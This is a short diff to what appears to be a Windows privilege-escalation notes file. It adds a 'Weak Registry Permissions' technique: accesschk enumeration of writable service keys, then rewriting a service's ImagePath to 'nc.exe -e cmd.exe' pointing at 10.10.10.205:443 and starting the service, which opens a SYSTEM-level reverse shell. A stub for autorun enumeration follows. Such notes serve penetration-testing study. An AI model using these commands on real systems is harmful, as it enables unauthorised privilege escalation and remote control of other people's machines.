@@ -763,3 +763,25 @@ SERVICE_NAME: SystemExplorerHelpService
         ERROR_CONTROL      : 0   IGNORE
         BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
 ```
+
+## Weak Registry Permissions
+
+```powershell
+accesschk.exe /accepteula "username" -kvuqsw hklm\System\CurrentControlSet\services
+
+>    RW HKLM\System\CurrentControlSet\services\ModelManagerService
+>    KEY_ALL_ACCESS
+
+Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
+
+sc start ModelManagerService
+
+
+## Modifiable Registry Autorun Binary
+Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
+
+
+
+```
+
+
